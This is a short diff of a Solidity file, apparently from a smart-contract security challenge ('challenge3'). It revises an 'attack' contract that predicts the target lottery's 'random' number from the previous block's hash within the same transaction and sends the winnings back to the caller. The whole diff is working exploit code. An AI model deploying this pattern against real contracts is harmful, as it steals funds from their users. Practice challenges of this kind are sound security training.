@@ -9,11 +9,10 @@ contract challenge3 {
 }
 
 contract attack {
-    constructor (address payable target) public payable {
-        require(msg.value == 1 ether);
-        challenge3 targetContract = challenge3(target);
-        targetContract.lottery.value(1 ether)(uint256(keccak256(abi.encode(blockhash(block.number)))));
-        //msg.sender.transfer(address(this).balance);
-        selfdestruct(msg.sender);
+    constructor (challenge3 target) public payable {
+        require(msg.value > 0);
+        target.lottery.value(msg.value)(uint256(keccak256(abi.encode(blockhash(block.number - 1)))));
+        msg.sender.transfer(address(this).balance);
+        //selfdestruct(msg.sender);
     }
 }
